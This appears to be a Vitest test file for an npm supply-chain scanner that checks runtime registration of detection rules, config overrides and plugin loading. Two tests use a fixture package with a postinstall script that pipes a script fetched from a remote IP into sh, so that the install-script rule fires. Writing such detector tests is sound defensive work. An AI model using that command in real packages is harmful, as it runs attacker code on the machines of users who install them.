import { describe, it, afterEach, expect } from "vitest";
import os from "node:os";
import path from "node:path";
import fs from "node:fs";

import { NpmSafeEngine } from "../src/index.js";
import { StaticAnalyzer } from "../src/scanner/static-rules.js";
import { RuleConfigManager } from "../src/scanner/rule-config.js";
import { FindingCategory, Severity } from "../src/scanner/types.js";

function tmpFile(prefix: string): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `npm-safe-${prefix}-`));
  return path.join(dir, `${prefix}.db`);
}

describe("StaticAnalyzer rule registration", () => {
  it("registers and unregisters rules at runtime", () => {
    const analyzer = new StaticAnalyzer([]);
    const rule = {
      id: "custom-rule",
      name: "Custom",
      description: "d",
      severity: Severity.High,
      category: FindingCategory.Informational,
      enabled: true,
      match: () => [
        {
          ruleId: "custom-rule",
          ruleName: "Custom",
          severity: Severity.High,
          message: "custom hit",
          category: FindingCategory.Informational,
        },
      ],
    };

    expect(analyzer.listRules().length).toBe(0);
    analyzer.registerRule(rule);
    expect(analyzer.listRules().length).toBe(1);
    expect(analyzer.listRules()[0].source).toBe("plugin");

    const report = analyzer.analyze("", { name: "pkg", version: "1.0.0" });
    expect(report.findings.length).toBe(1);
    expect(report.findings[0].ruleId).toBe("custom-rule");

    expect(analyzer.unregisterRule("custom-rule")).toBe(true);
    expect(analyzer.listRules().length).toBe(0);
    expect(analyzer.unregisterRule("custom-rule")).toBe(false);
  });

  it("replaces a rule with the same id", () => {
    const analyzer = new StaticAnalyzer();
    const before = analyzer.listRules().find((r) => r.id === "typosquatting");
    expect(before).toBeTruthy();
    const replacement = {
      id: "typosquatting",
      name: "Typosquatting v2",
      description: "d",
      severity: Severity.Low,
      category: FindingCategory.Typosquatting,
      enabled: true,
      match: () => [],
    };
    analyzer.registerRule(replacement);
    const after = analyzer.listRules().find((r) => r.id === "typosquatting");
    expect(after?.severity).toBe(Severity.Low);
  });
});

describe("Rule config overrides in StaticAnalyzer", () => {
  it("disables a rule via config", () => {
    const config = new RuleConfigManager(
      path.join(fs.mkdtempSync(path.join(os.tmpdir(), "rc-")), "rules.json"),
    );
    config.setEnabled("install-script", false);
    const analyzer = new StaticAnalyzer(undefined, config);

    const report = analyzer.analyze("", {
      name: "evil",
      version: "1.0.0",
      scripts: { postinstall: "curl http://13.37.13.37/shell | sh" },
    });
    expect(report.findings.length).toBe(0);
    const descriptor = analyzer.listRules().find((r) => r.id === "install-script");
    expect(descriptor?.enabled).toBe(false);
  });

  it("overrides finding severity via config", () => {
    const config = new RuleConfigManager(
      path.join(fs.mkdtempSync(path.join(os.tmpdir(), "rc-")), "rules.json"),
    );
    config.setSeverity("install-script", Severity.Medium);
    const analyzer = new StaticAnalyzer(undefined, config);

    const report = analyzer.analyze("", {
      name: "evil",
      version: "1.0.0",
      scripts: { postinstall: "curl http://13.37.13.37/shell | sh" },
    });
    const finding = report.findings.find((f) => f.ruleId === "install-script");
    expect(finding).toBeTruthy();
    expect(finding!.severity).toBe(Severity.Medium);
    const descriptor = analyzer.listRules().find((r) => r.id === "install-script");
    expect(descriptor?.severity).toBe(Severity.Medium);
  });
});

describe("NpmSafeEngine rule API", () => {
  let engine: NpmSafeEngine;

  afterEach(() => {
    engine?.close();
  });

  it("exposes rule list and register/unregister", async () => {
    engine = new NpmSafeEngine({
      dbPath: tmpFile("engine"),
      rulesConfigPath: path.join(fs.mkdtempSync(path.join(os.tmpdir(), "ec-")), "rules.json"),
      rulesDir: path.join(os.tmpdir(), "no-such-rules-dir"),
    });

    const builtin = engine.listRules().filter((r) => r.source === "builtin");
    expect(builtin.length).toBe(10);

    engine.registerRule({
      id: "engine-custom",
      name: "Engine Custom",
      description: "d",
      severity: Severity.Low,
      category: FindingCategory.Informational,
      enabled: true,
      match: () => [],
    });
    expect(engine.listRules().some((r) => r.id === "engine-custom")).toBeTruthy();
    expect(engine.unregisterRule("engine-custom")).toBe(true);
  });

  it("persists rule enable/disable and reflects it in listRules", async () => {
    engine = new NpmSafeEngine({
      dbPath: tmpFile("engine2"),
      rulesConfigPath: path.join(fs.mkdtempSync(path.join(os.tmpdir(), "ec2-")), "rules.json"),
      rulesDir: path.join(os.tmpdir(), "no-such-rules-dir"),
    });

    engine.setRuleEnabled("install-script", false);
    const descriptor = engine.listRules().find((r) => r.id === "install-script");
    expect(descriptor?.enabled).toBe(false);

    engine.setRuleEnabled("install-script", true);
    const after = engine.listRules().find((r) => r.id === "install-script");
    expect(after?.enabled).toBe(true);
  });

  it("loads plugin rules from a directory", async () => {
    const rulesDir = fs.mkdtempSync(path.join(os.tmpdir(), "plugins-"));
    fs.writeFileSync(
      path.join(rulesDir, "plugin.mjs"),
      `export const rule = {
        id: "dir-plugin",
        name: "Dir Plugin",
        description: "d",
        severity: "high",
        category: "informational",
        enabled: true,
        match: () => [],
      };`,
      "utf8",
    );

    engine = new NpmSafeEngine({
      dbPath: tmpFile("engine3"),
      rulesConfigPath: path.join(fs.mkdtempSync(path.join(os.tmpdir(), "ec3-")), "rules.json"),
      rulesDir,
    });
    await new Promise((r) => setTimeout(r, 50));
    expect(engine.listRules().some((r) => r.id === "dir-plugin")).toBeTruthy();
  });
});
